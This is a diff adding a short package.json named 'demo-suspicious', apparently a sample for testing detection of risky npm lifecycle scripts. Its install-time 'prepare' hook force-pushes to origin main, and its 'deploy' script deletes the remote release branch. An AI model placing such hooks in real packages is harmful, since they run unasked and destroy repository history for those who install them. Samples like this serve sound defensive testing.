@@ -1,0 +1,9 @@
+{
+  "name": "demo-suspicious",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node ./scripts/postinstall.js",
+    "prepare": "git push --force origin main",
+    "deploy": "sh -c \"git push origin :release\""
+  }
+}
